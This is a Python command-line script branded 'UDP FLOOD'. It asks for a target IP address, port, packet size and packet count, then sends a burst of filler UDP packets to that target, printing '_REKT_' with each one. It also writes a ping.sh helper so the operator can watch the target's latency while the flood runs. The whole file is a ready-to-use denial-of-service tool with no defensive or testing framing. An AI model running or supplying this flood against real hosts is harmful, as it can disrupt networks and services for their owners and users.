import socket
import os 
import threading 


def makebash(ip_address):
    bash_script_name = "ping.sh"
    bash_script_content = f"""#!/bin/bash
while true; do
    ping -c 1 {ip_address}
    sleep 3
done
"""
    
    with open(bash_script_name, 'w') as bash_file:
        bash_file.write(bash_script_content)    
    os.chmod(bash_script_name, 0o755)    
    print(color_yellow(f"File '{bash_script_name}' created."))

def execute_bash_script():
    os.system('./ping.sh')

def color_red(text):
    RED = "\033[91m" 
    RESET = "\033[0m" 
    return f"{RED}{text}{RESET}" 

def color_white(text):
    WHITE = "\u001b[37m"
    RESET = "\033[0m"
    return f"{WHITE}{text}{RESET}"

def color_yellow(text):
    YELLOW = "\033[0;33m" 
    RESET = "\033[0m"
    return f"{YELLOW}{text}{RESET}"
    
def color_green(text):
    GREEN = "\033[32m" 
    RESET = "\033[0m"
    return f"{GREEN}{text}{RESET}"

def create_message(size):
    return b'X' * size 

print(color_red(""" 

  _   _ ____  ____    _____ _     ___   ___  ____  
 | | | |  _ \|  _ \  |  ___| |   / _ \ / _ \|  _ \ 
 | | | | | | | |_) | | |_  | |  | | | | | | | | | |
 | |_| | |_| |  __/  |  _| | |__| |_| | |_| | |_| |
  \___/|____/|_|     |_|   |_____\___/ \___/|____/ 
                                                   

"""))

UDP_IP = input(color_red("Enter the target IP address (e.g., 127.0.0.1): "))
UDP_PORT = int(input(color_red("Enter the target port (e.g., 5005): ")))
packet_size = int(input(color_red("Enter the packet size in bytes (1 - 9216): ")))
print(color_yellow("FLOOD will be initialized after next input.")) 
print(color_yellow("Run ./FLOOD/ping.sh in a seperate terminal after initializing "))
print(color_yellow("to monitor ping of " + color_green(UDP_IP)))
amount = int(input(color_red("Enter the number of packets to send: ")))

MESSAGE = create_message(packet_size)

user_ip = UDP_IP
    
makebash(user_ip)

print(color_green("~FLOOD INITIATED~"))
    
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

for i in range(amount):
    sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
    print(color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}"))

print(color_green("~DONE~")) 
